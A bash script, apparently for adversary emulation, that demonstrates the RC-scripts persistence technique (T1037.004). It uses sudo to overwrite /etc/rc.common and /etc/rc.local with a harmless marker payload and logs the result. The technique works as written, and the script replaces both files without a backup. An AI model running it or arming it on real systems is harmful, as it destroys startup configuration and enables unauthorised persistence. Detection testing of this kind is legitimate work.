#!/bin/bash

OUTPUT_DIR="Output/Persistence"
OUTPUT_FILE="$OUTPUT_DIR/T1037.004_Persistence.txt"
mkdir -p "$OUTPUT_DIR"

# Simple payload
PAYLOAD='echo "SISA T1037.004 triggered" > /tmp/T1037.004.log'

# Modify rc.common
echo "[*] Adding persistence to /etc/rc.common" | tee -a "$OUTPUT_FILE"
echo -e "#!/bin/bash\n$PAYLOAD\nexit 0" | sudo tee /etc/rc.common > /dev/null
sudo chmod +x /etc/rc.common

# Modify rc.local
echo "[*] Adding persistence to /etc/rc.local" | tee -a "$OUTPUT_FILE"
echo -e "#!/bin/bash\n$PAYLOAD\nexit 0" | sudo tee /etc/rc.local > /dev/null
sudo chmod +x /etc/rc.local

# Show the contents
echo -e "\n[+] /etc/rc.common content:" | tee -a "$OUTPUT_FILE"
sudo cat /etc/rc.common | tee -a "$OUTPUT_FILE"
echo -e "\n[+] /etc/rc.local content:" | tee -a "$OUTPUT_FILE"
sudo cat /etc/rc.local | tee -a "$OUTPUT_FILE"

echo "[✓] T1037.004 persistence added." | tee -a "$OUTPUT_FILE"
